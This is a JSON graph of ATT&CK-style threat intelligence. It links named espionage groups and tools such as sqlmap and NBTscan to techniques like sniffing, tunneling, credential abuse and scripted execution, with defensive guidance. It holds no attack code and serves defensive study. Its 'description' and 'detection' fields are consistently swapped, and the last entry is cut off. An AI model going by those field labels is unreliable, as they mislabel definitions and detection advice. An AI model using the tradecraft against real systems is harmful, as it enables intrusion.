{
    "nodes": [
        {
            "id": "G0130",
            "type": "group",
            "attributes": {
                "val": 2,
                "name": "Ajax Security Team",
                "aliases": [
                    "Operation Woolen-Goldfish",
                    "AjaxTM",
                    "Rocket Kitten",
                    "Flying Kitten",
                    "Operation Saffron Rose"
                ],
                "description": "Ajax Security Team is a group that has been active since at least 2010 and believed to be operating out of Iran. By 2014 Ajax Security Team transitioned from website defacement operations to malware-based cyber espionage campaigns targeting the US defense industrial base and Iranian users of anti-censorship technologies.",
                "tools": [
                    "S0225",
                    "S0224"
                ],
                "techniques": [
                    "T1204.002",
                    "T1566.003",
                    "T1566.001",
                    "T1555.003",
                    "T1056.001",
                    "T1105"
                ],
                "affiliation": "",
                "targets": [],
                "speciality": []
            }
        },
        {
            "id": "T1190",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Exploit Public-Facing Application",
                "chain_phase": "initial-access",
                "description": "Monitor application logs for abnormal behavior that may indicate attempted or successful exploitation. Use deep packet inspection to look for artifacts of common exploit traffic, such as SQL injection. Web Application Firewalls may detect improper inputs attempting exploitation.",
                "detection": "Adversaries may attempt to take advantage of a weakness in an Internet-facing computer or program using software, data, or commands in order to cause unintended or unanticipated behavior. The weakness in the system can be a bug, a glitch, or a design vulnerability. These applications are often websites, but can include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other applications with Internet accessible open sockets, such as web servers and related services. Depending on the flaw being exploited this may include Exploitation for Defense Evasion. \n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via Escape to Host, or take advantage of weak identity and access management policies.\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.",
                "is_subtype": false,
                "platforms": [
                    "Windows",
                    "IaaS",
                    "Network",
                    "Linux",
                    "macOS",
                    "Containers"
                ]
            }
        },
        {
            "id": "S0225",
            "type": "tool",
            "attributes": {
                "name": "sqlmap",
                "aliases": [],
                "labels": [
                    "tool"
                ],
                "description": "sqlmap is an open source penetration testing tool that can be used to automate the process of detecting and exploiting SQL injection flaws. ",
                "platforms": [
                    "Linux",
                    "Windows",
                    "macOS"
                ]
            },
            "val": 1,
            "techniques": [
                "T1190"
            ]
        },
        {
            "id": "S0224",
            "type": "tool",
            "attributes": {
                "name": "Havij",
                "aliases": [],
                "labels": [
                    "tool"
                ],
                "description": "Havij is an automatic SQL Injection tool distributed by the Iranian ITSecTeam security company. Havij has been used by penetration testers and adversaries. ",
                "platforms": [
                    "Linux",
                    "Windows",
                    "macOS"
                ]
            },
            "val": 1,
            "techniques": [
                "T1190"
            ]
        },
        {
            "id": "G0129",
            "type": "group",
            "attributes": {
                "val": 4,
                "name": "Mustang Panda",
                "aliases": [
                    "TA416",
                    "RedDelta",
                    "BRONZE PRESIDENT"
                ],
                "description": "Mustang Panda is a China-based cyber espionage threat actor that was first observed in 2017 but may have been conducting operations since at least 2014. Mustang Panda has targeted government entities, nonprofits, religious, and other non-governmental organizations in the U.S., Germany, Mongolia, Myanmar, Pakistan, and Vietnam, among others. ",
                "tools": [
                    "S0012",
                    "S0154",
                    "S0590",
                    "S0013"
                ],
                "techniques": [
                    "T1583.001",
                    "T1573.001",
                    "T1071.001",
                    "T1074.001",
                    "T1574.002",
                    "T1204.002",
                    "T1204.001",
                    "T1052.001",
                    "T1059.005",
                    "T1059.003",
                    "T1059.001",
                    "T1566.002",
                    "T1566.001",
                    "T1564.001",
                    "T1560.003",
                    "T1560.001",
                    "T1003.003",
                    "T1036.005",
                    "T1027.001",
                    "T1070.004",
                    "T1546.003",
                    "T1547.001",
                    "T1218.005",
                    "T1218.004",
                    "T1053.005",
                    "T1518",
                    "T1219",
                    "T1203",
                    "T1119",
                    "T1105",
                    "T1091",
                    "T1083",
                    "T1082",
                    "T1057",
                    "T1049",
                    "T1047",
                    "T1036",
                    "T1027",
                    "T1016"
                ],
                "affiliation": "",
                "targets": [],
                "speciality": []
            }
        },
        {
            "id": "T1046",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Network Service Scanning",
                "chain_phase": "discovery",
                "description": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nNormal, benign system and network events from legitimate remote service scanning may be uncommon, depending on the environment and how they are used. Legitimate open port and vulnerability scanning may be conducted within the environment and will need to be deconflicted with any detection capabilities developed. Network intrusion detection systems can also be used to identify scanning activity. Monitor for process use of the networks and inspect intra-network flows to detect port scans.",
                "detection": "Adversaries may attempt to get a listing of services running on remote hosts, including those that may be vulnerable to remote software exploitation. Methods to acquire this information include port scans and vulnerability scans using tools that are brought onto a system. \n\nWithin cloud environments, adversaries may attempt to discover services running on other cloud hosts. Additionally, if the cloud environment is connected to a on-premises environment, adversaries may be able to identify services running on non-cloud systems as well.",
                "is_subtype": false,
                "platforms": [
                    "Windows",
                    "IaaS",
                    "Linux",
                    "macOS",
                    "Containers"
                ]
            }
        },
        {
            "id": "T1040",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Network Sniffing",
                "chain_phase": "credential-access",
                "description": "Detecting the events leading up to sniffing network traffic may be the best method of detection. From the host level, an adversary would likely need to perform a [Man-in-the-Middle](https://attack.mitre.org/techniques/T1557) attack against other devices on a wired network in order to capture traffic that was not to or from the current compromised system. This change in the flow of information is detectable at the enclave network level. Monitor for ARP spoofing and gratuitous ARP broadcasts. Detecting compromised network devices is a bit more challenging. Auditing administrator logins, configuration changes, and device images is required to detect malicious changes.",
                "detection": "Adversaries may sniff network traffic to capture information about an environment, including authentication material passed over the network. Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.\n\nData captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as LLMNR/NBT-NS Poisoning and SMB Relay, can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.\n\nNetwork sniffing may also reveal configuration details, such as running services, version numbers, and other network characteristics (e.g. IP addresses, hostnames, VLAN IDs) necessary for subsequent Lateral Movement and/or Defense Evasion activities.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows",
                    "Network"
                ]
            }
        },
        {
            "id": "T1033",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "System Owner/User Discovery",
                "chain_phase": "discovery",
                "description": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
                "detection": "Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using OS Credential Dumping. The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from System Owner/User Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nUtilities and commands that acquire this information include <code>whoami</code>. In Mac and Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1018",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Remote System Discovery",
                "chain_phase": "discovery",
                "description": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nNormal, benign system and network events related to legitimate remote system discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\n\nMonitor for processes that can be used to discover remote systems, such as <code>ping.exe</code> and <code>tracert.exe</code>, especially when executed in quick succession.(Citation: Elastic - Koadiac Detection with EQL)",
                "detection": "Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used such as  Ping or <code>net view</code> using Net. Adversaries may also use local host files (ex: <code>C:\\Windows\\System32\\Drivers\\etc\\hosts</code> or <code>/etc/hosts</code>) in order to discover the hostname to IP address mappings of remote systems. \n\nSpecific to macOS, the <code>bonjour</code> protocol exists to discover additional Mac-based systems within the same broadcast domain.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1016",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "System Network Configuration Discovery",
                "chain_phase": "discovery",
                "description": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
                "detection": "Adversaries may look for details about the network configuration and settings of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include Arp, ipconfig/ifconfig, nbtstat, and route.\n\nAdversaries may use the information from System Network Configuration Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "S0590",
            "type": "tool",
            "attributes": {
                "name": "NBTscan",
                "aliases": [],
                "labels": [
                    "tool"
                ],
                "description": "NBTscan is an open source tool that has been used by state groups to conduct internal reconnaissance within a compromised network.",
                "platforms": [
                    "Windows",
                    "Linux",
                    "macOS"
                ]
            },
            "val": 5,
            "techniques": [
                "T1033",
                "T1016",
                "T1046",
                "T1040",
                "T1018"
            ]
        },
        {
            "id": "T1059.007",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "JavaScript",
                "chain_phase": "execution",
                "description": "Monitor for events associated with scripting execution, such as process activity, usage of the Windows Script Host (typically cscript.exe or wscript.exe), file activity involving scripts, or loading of modules associated with scripting languages (ex: JScript.dll). Scripting execution is likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for execution and subsequent behavior. Actions may be related to network and system information [Discovery](https://attack.mitre.org/tactics/TA0007), [Collection](https://attack.mitre.org/tactics/TA0009), or other programmable post-compromise behaviors and could be used as indicators of detection leading back to the source.\n\nMonitor for execution of JXA through <code>osascript</code> and usage of <code>OSAScript</code> API that may be related to other suspicious behavior occurring on the system.\n\nUnderstanding standard usage patterns is important to avoid a high number of false positives. If scripting is restricted for normal users, then any attempts to enable related components running on a system would be considered suspicious. If scripting is not commonly used on a system, but enabled, execution running out of cycle from patching or other administrator functions is suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.",
                "detection": "Adversaries may abuse various implementations of JavaScript for execution. JavaScript (JS) is a platform-independent scripting language (compiled just-in-time at runtime) commonly associated with scripts in webpages, though JS can be executed in runtime environments outside the browser.\n\nJScript is the Microsoft implementation of the same scripting standard. JScript is interpreted via the Windows Script engine and thus integrated with many components of Windows such as the Component Object Model and Internet Explorer HTML Application (HTA) pages.\n\nJavaScript for Automation (JXA) is a macOS scripting language based on JavaScript, included as part of Apple’s Open Scripting Architecture (OSA), that was introduced in OSX 10.10. Apple’s OSA provides scripting capabilities to control applications, interface with the operating system, and bridge access into the rest of Apple’s internal APIs. As of OSX 10.10, OSA only supports two languages, JXA and AppleScript. Scripts can be executed via the command line utility <code>osascript</code>, they can be compiled into applications or script files via <code>osacompile</code>, and they can be compiled and executed in memory of other programs by leveraging the OSAKit Framework.\n\nAdversaries may abuse various implementations of JavaScript to execute various behaviors. Common uses include hosting malicious scripts on websites as part of a Drive-by Compromise or downloading and executing these script files as secondary payloads. Since these payloads are text-based, it is also very common for adversaries to obfuscate their content as part of Obfuscated Files or Information.",
                "is_subtype": true,
                "platforms": [
                    "Windows",
                    "macOS",
                    "Linux"
                ]
            }
        },
        {
            "id": "T1027.005",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Indicator Removal from Tools",
                "chain_phase": "defense-evasion",
                "description": "The first detection of a malicious tool may trigger an anti-virus or other security tool alert. Similar events may also occur at the boundary through network IDS, email scanning appliance, etc. The initial detection should be treated as an indication of a potentially more invasive intrusion. The alerting system should be thoroughly investigated beyond that initial alert for activity that was not detected. Adversaries may continue with an operation, assuming that individual events like an anti-virus detect will not be investigated or that an analyst will not be able to conclusively link that event to other activity occurring on the network.",
                "detection": "Adversaries may remove indicators from tools if they believe their malicious tool was detected, quarantined, or otherwise curtailed. They can modify the tool by removing the indicator and using the updated version that is no longer detected by the target's defensive systems or subsequent targets that may use similar systems.\n\nA good example of this is when malware is detected with a file signature and quarantined by anti-virus software. An adversary who can determine that the malware was quarantined because of its file signature may modify the file to explicitly avoid that signature, and then re-use the malware.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1573.002",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Asymmetric Cryptography",
                "chain_phase": "command-and-control",
                "description": "SSL/TLS inspection is one way of detecting command and control traffic within some encrypted communication channels.(Citation: SANS Decrypting SSL) SSL/TLS inspection does come with certain risks that should be considered before implementing to avoid potential security issues such as incomplete certificate validation.(Citation: SEI SSL Inspection Risks)\n\nIn general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)",
                "detection": "Adversaries may employ a known asymmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Asymmetric cryptography, also known as public key cryptography, uses a keypair per party: one public that can be freely distributed, and one private. Due to how the keys are generated, the sender encrypts data with the receiver’s public key and the receiver decrypts the data with their private key. This ensures that only the intended recipient can read the encrypted data. Common public key encryption algorithms include RSA and ElGamal.\n\nFor efficiency, many protocols (including SSL/TLS) use symmetric cryptography once a connection is established, but use asymmetric cryptography to establish or transmit a key. As such, these protocols are classified as Asymmetric Cryptography.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1573.001",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Symmetric Cryptography",
                "chain_phase": "command-and-control",
                "description": "With symmetric encryption, it may be possible to obtain the algorithm and key from samples and use them to decode network traffic to detect malware communications signatures.\n\nIn general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)",
                "detection": "Adversaries may employ a known symmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Symmetric encryption algorithms use the same key for plaintext encryption and ciphertext decryption. Common symmetric encryption algorithms include AES, DES, 3DES, Blowfish, and RC4.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "Windows",
                    "macOS"
                ]
            }
        },
        {
            "id": "T1071.004",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "DNS",
                "chain_phase": "command-and-control",
                "description": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol standards regarding syntax, structure, or any other variable adversaries could leverage to conceal data.(Citation: University of Birmingham C2)\n\nMonitor for DNS traffic to/from known-bad or suspicious domains.",
                "detection": "Adversaries may communicate using the Domain Name System (DNS) application layer protocol to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nThe DNS protocol serves an administrative function in computer networking and thus may be very common in environments. DNS traffic may also be allowed even before network authentication is completed. DNS packets contain many fields and headers in which data can be concealed. Often known as DNS tunneling, adversaries may abuse DNS to communicate with systems under their control within a victim network while also mimicking normal, expected traffic. ",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1071.001",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Web Protocols",
                "chain_phase": "command-and-control",
                "description": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol standards regarding syntax, structure, or any other variable adversaries could leverage to conceal data.(Citation: University of Birmingham C2)\n\nMonitor for web traffic to/from known-bad or suspicious domains. ",
                "detection": "Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as HTTP and HTTPS that carry web traffic may be very common in environments. HTTP/S packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic. ",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1572",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Protocol Tunneling",
                "chain_phase": "command-and-control",
                "description": "Monitoring for systems listening and/or establishing external connections using ports/protocols commonly associated with tunneling, such as SSH (port 22). Also monitor for processes commonly associated with tunneling, such as Plink and the OpenSSH client. \n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol standards regarding syntax, structure, or any other variable adversaries could leverage to conceal data.(Citation: University of Birmingham C2)",
                "detection": "Adversaries may tunnel network communications to and from a victim system within a separate protocol to avoid detection/network filtering and/or enable access to otherwise unreachable systems. Tunneling involves explicitly encapsulating a protocol within another. This behavior may conceal malicious traffic by blending in with existing traffic and/or provide an outer layer of encryption (similar to a VPN). Tunneling could also enable routing of network packets that would otherwise not reach their intended destination, such as SMB, RDP, or other traffic that would be filtered by network appliances or not routed over the Internet. \n\nThere are various means to encapsulate a protocol within another protocol. For example, adversaries may perform SSH tunneling (also known as SSH port forwarding), which involves forwarding arbitrary data over an encrypted SSH tunnel. \n\nProtocol Tunneling may also be abused by adversaries during Dynamic Resolution. Known as DNS over HTTPS (DoH), queries to resolve C2 infrastructure may be encapsulated within encrypted HTTPS packets. \n\nAdversaries may also leverage Protocol Tunneling in conjunction with Proxy and/or Protocol Impersonation to further conceal C2 communications and infrastructure. ",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1090.001",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Internal Proxy",
                "chain_phase": "command-and-control",
                "description": "Analyze network data for uncommon data flows between clients that should not or often do not communicate with one another. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)",
                "detection": "Adversaries may use an internal proxy to direct command and control traffic between two or more systems in a compromised environment. Many tools exist that enable traffic redirection through proxies or port redirection, including HTRAN, ZXProxy, and ZXPortMap.  Adversaries use internal proxies to manage command and control communications inside a compromised environment, to reduce the number of simultaneous outbound network connections, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between infected systems to avoid suspicion. Internal proxy connections may use common peer-to-peer (p2p) networking protocols, such as SMB, to better blend in with the environment.\n\nBy using a compromised internal system as a proxy, adversaries may conceal the true destination of C2 traffic while reducing the need for numerous connections to external systems.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1078.003",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Local Accounts",
                "chain_phase": "defense-evasion",
                "description": "Perform regular audits of local system accounts to detect accounts that may have been created by an adversary for persistence. Look for suspicious account behavior, such as accounts logged in at odd times or outside of business hours.",
                "detection": "Adversaries may obtain and abuse credentials of a local account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service.\n\nLocal Accounts may also be abused to elevate privileges and harvest credentials through OS Credential Dumping. Password reuse may allow the abuse of local accounts across a set of machines on a network for the purposes of Privilege Escalation and Lateral Movement. ",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows",
                    "Containers"
                ]
            }
        },
        {
            "id": "T1078.002",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Domain Accounts",
                "chain_phase": "defense-evasion",
                "description": "Configure robust, consistent account activity audit policies across the enterprise and with externally accessible services.(Citation: TechNet Audit Policy) Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).\n\nPerform regular audits of domain accounts to detect accounts that may have been created by an adversary for persistence.",
                "detection": "Adversaries may obtain and abuse credentials of a domain account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion.  Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover users, administrators, and services.\n\nAdversaries may compromise domain accounts, some with a high level of privileges, through various means such as OS Credential Dumping or password reuse, allowing access to privileged resources of the domain.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1569.002",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Service Execution",
                "chain_phase": "execution",
                "description": "Changes to service Registry entries and command line invocation of tools capable of modifying services that do not correlate with known software, patch cycles, etc., may be suspicious. If a service is used only to execute a binary or script and not to persist, then it will likely be changed back to its original form shortly after the service is restarted so the service is not left broken, as is the case with the common administrator tool [PsExec](https://attack.mitre.org/software/S0029).",
                "detection": "Adversaries may abuse the Windows service control manager to execute malicious commands or payloads. The Windows service control manager (<code>services.exe</code>) is an interface to manage and manipulate services. The service control manager is accessible to users via GUI components as well as system utilities such as <code>sc.exe</code> and Net.\n\nPsExec can also be used to execute commands or payloads via a temporary Windows service created through the service control manager API.\n\nAdversaries may leverage these mechanisms to execute malicious content. This can be done by either executing a new or modified service. This technique is the execution used in conjunction with Windows Service during service persistence or privilege escalation.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1059.006",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Python",
                "chain_phase": "execution",
                "description": "Monitor systems for abnormal Python usage and python.exe behavior, which could be an indicator of malicious activity. Understanding standard usage patterns is important to avoid a high number of false positives. If scripting is restricted for normal users, then any attempts to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.\n\nScripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information Discovery, Collection, or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script.",
                "detection": "Adversaries may abuse Python commands and scripts for execution. Python is a very popular scripting/programming language, with capabilities to perform many functions. Python can be executed interactively from the command-line (via the <code>python.exe</code> interpreter) or via scripts (.py) that can be written and distributed to different systems. Python code can also be compiled into binary executables.\n\nPython comes with many built-in packages to interact with the underlying system, such as file operations and device I/O. Adversaries can use these libraries to download and execute commands or other scripts as well as perform various malicious behaviors.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "Windows",
                    "macOS"
                ]
            }
        },
        {
            "id": "T1059.005",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Visual Basic",
                "chain_phase": "execution",
                "description": "Monitor for events associated with VB execution, such as Office applications spawning processes, usage of the Windows Script Host (typically cscript.exe or wscript.exe), file activity involving VB payloads or scripts, or loading of modules associated with VB languages (ex: vbscript.dll). VB execution is likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for execution and subsequent behavior. Actions may be related to network and system information [Discovery](https://attack.mitre.org/tactics/TA0007), [Collection](https://attack.mitre.org/tactics/TA0009), or other programable post-compromise behaviors and could be used as indicators of detection leading back to the source.\n\nUnderstanding standard usage patterns is important to avoid a high number of false positives. If VB execution is restricted for normal users, then any attempts to enable related components running on a system would be considered suspicious. If VB execution is not commonly used on a system, but enabled, execution running out of cycle from patching or other administrator functions is suspicious. Payloads and scripts should be captured from the file system when possible to determine their actions and intent.",
                "detection": "Adversaries may abuse Visual Basic (VB) for execution. VB is a programming language created by Microsoft with interoperability with many Windows technologies such as Component Object Model and the Native API through the Windows API. Although tagged as legacy with no planned future evolutions, VB is integrated and supported in the .NET Framework and cross-platform .NET Core.\n\nDerivative languages based on VB have also been created, such as Visual Basic for Applications (VBA) and VBScript. VBA is an event-driven programming language built into Microsoft Office, as well as several third-party applications. VBA enables documents to contain macros used to automate the execution of tasks and other functionality on the host. VBScript is a default scripting language on Windows hosts and can also be used in place of JavaScript on HTML Application (HTA) webpages served to Internet Explorer (though most modern browsers do not come with VBScript support).\n\nAdversaries may use VB payloads to execute malicious commands. Common malicious usage includes automating execution of behaviors with VBScript or embedding VBA content into Spearphishing Attachment payloads.",
                "is_subtype": true,
                "platforms": [
                    "Windows",
                    "macOS",
                    "Linux"
                ]
            }
        },
        {
            "id": "T1059.003",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Windows Command Shell",
                "chain_phase": "execution",
                "description": "Usage of the Windows command shell may be common on administrator, developer, or power user systems depending on job function. If scripting is restricted for normal users, then any attempt to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.\n\nScripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information Discovery, Collection, or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script.",
                "detection": "Adversaries may abuse the Windows command shell for execution. The Windows command shell (cmd) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. \n\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may leverage cmd to execute various commands and payloads. Common uses include cmd to execute a single command, or abusing cmd interactively with input and output forwarded over a command and control channel.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1059.001",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "PowerShell",
                "chain_phase": "execution",
                "description": "If proper execution policy is set, adversaries will likely be able to define their own execution policy if they obtain administrator or system access, either through the Registry or at the command line. This change in policy on a system may be a way to detect malicious use of PowerShell. If PowerShell is not used in an environment, then simply looking for PowerShell execution may detect malicious activity.\n\nMonitor for loading and/or execution of artifacts associated with PowerShell specific assemblies, such as System.Management.Automation.dll (especially to unusual process names/locations).(Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015)\n\nIt is also beneficial to turn on PowerShell logging to gain increased fidelity in what occurs during execution (which is applied to .NET invocations). (Citation: Malware Archaeology PowerShell Cheat Sheet) PowerShell 5.0 introduced enhanced logging capabilities, and some of those features have since been added to PowerShell 4.0. Earlier versions of PowerShell do not have many logging features.(Citation: FireEye PowerShell Logging 2016) An organization can gather PowerShell execution details in a data analytic platform to supplement it with other data.",
                "detection": "Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system.  Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).\n\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\n\nA number of PowerShell-based offensive testing tools are available, including Empire,  PowerSploit, PoshC2, and PSAttack.\n\nPowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI). ",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1087.002",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Domain Account",
                "chain_phase": "discovery",
